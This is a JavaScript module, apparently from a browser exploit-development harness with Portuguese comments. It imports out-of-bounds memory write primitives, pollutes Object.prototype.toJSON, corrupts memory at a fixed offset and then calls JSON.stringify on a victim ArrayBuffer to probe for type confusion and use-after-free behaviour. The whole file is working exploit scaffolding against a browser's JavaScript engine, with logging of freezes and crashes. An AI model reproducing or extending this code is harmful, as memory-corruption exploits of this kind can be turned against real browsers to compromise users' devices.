// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const FOCUSED_TEST_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKeyToPollute: 'toJSON',
};

// Este contador será usado pelas funções toJSON definidas em runAllAdvancedTestsS3.mjs
export let currentCallCount_toJSON = 0;

export async function executeFullFreezeScenarioTest(
    testVariantDescription,
    toJSONFunctionLogic // A função que será usada como Object.prototype.toJSON
) {
    const FNAME_TEST = `executeFullFreezeScenario<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset,
        value_to_write,
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = FOCUSED_TEST_PARAMS;

    logS3(`--- Iniciando Teste de Congelamento (Cenário Completo): ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}`, "info", FNAME_TEST);
    document.title = `Iniciando: ${testVariantDescription}`;

    currentCallCount_toJSON = 0; // Resetar contador para cada variante de teste

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return { potentiallyFroze: false, errorOccurred: true };
    }
    document.title = "OOB Configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = false;
    let stepReached = "antes_pp";
    let potentiallyFroze = true; // Assumir que vai congelar até que complete ou capture erro JS
    let errorOccurred = false;

    try {
        logS3(`Tentando poluir Object.prototype.${ppKeyToPollute} com lógica: ${testVariantDescription}`, "info", FNAME_TEST);
        document.title = `Aplicando PP: ${testVariantDescription}`;
        stepReached = "aplicando_pp";

        Object.defineProperty(Object.prototype, ppKeyToPollute, {
            value: toJSONFunctionLogic,
            writable: true, configurable: true, enumerable: false
        });
        pollutionAppliedThisRun = true;
        logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
        stepReached = "pp_aplicada";
        document.title = `PP Aplicada: ${testVariantDescription}`;

        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB: ${testVariantDescription}`;
        oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB: ${testVariantDescription}`;
        
        await PAUSE_S3(SHORT_PAUSE_S3); // Pequena pausa antes do stringify

        stepReached = "antes_stringify";
        document.title = `Antes Stringify: ${testVariantDescription}`;
        logS3(`Chamando JSON.stringify(victim_ab)... (PONTO CRÍTICO PARA CONGELAMENTO)`, "info", FNAME_TEST);
        let stringifyResult = null;
        try {
            // A função toJSONFunctionLogic será chamada aqui DENTRO pelo stringify
            stringifyResult = JSON.stringify(victim_ab); 
            stepReached = "apos_stringify";
            document.title = `Stringify Retornou: ${testVariantDescription}`;
            potentiallyFroze = false;
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_TEST);
            // Verificar se o toJSON retornou um erro que foi stringificado
            if (stringifyResult && typeof stringifyResult === 'string' && 
                (stringifyResult.includes("toJSON_error_") || stringifyResult.includes("toJSON_this_is_null"))) { // Adaptar às chaves de erro das suas toJSON
                logS3("SUCESSO ESPECULATIVO: Erro indicado no resultado do toJSON stringificado.", "vuln", FNAME_TEST);
                errorOccurred = true; // Considerar um erro JS dentro do toJSON como um "não congelamento"
            }
        } catch (e) {
            stepReached = "erro_stringify";
            document.title = `ERRO Stringify (${e.name}): ${testVariantDescription}`;
            potentiallyFroze = false;
            errorOccurred = true;
            logS3(`ERRO CRÍTICO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal: ${testVariantDescription}`;
        potentiallyFroze = false;
        errorOccurred = true;
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
        if (potentiallyFroze) {
            logS3(`O TESTE PODE TER CONGELADO. Último passo logado: ${stepReached}. Chamadas toJSON: ${currentCallCount_toJSON}`, "warn", FNAME_TEST);
            document.title = `CONGELOU? Passo: ${stepReached} - Chamadas: ${currentCallCount_toJSON} - ${testVariantDescription}`;
        }
    }
    logS3(`--- Teste de Congelamento Concluído: ${testVariantDescription} (Chamadas toJSON: ${currentCallCount_toJSON}) ---`, "test", FNAME_TEST);
    if (!potentiallyFroze && !errorOccurred) {
        document.title = `Teste OK (sem congelar/erro JS): ${testVariantDescription}`;
    }
    return { potentiallyFroze, errorOccurred, calls: currentCallCount_toJSON };
}
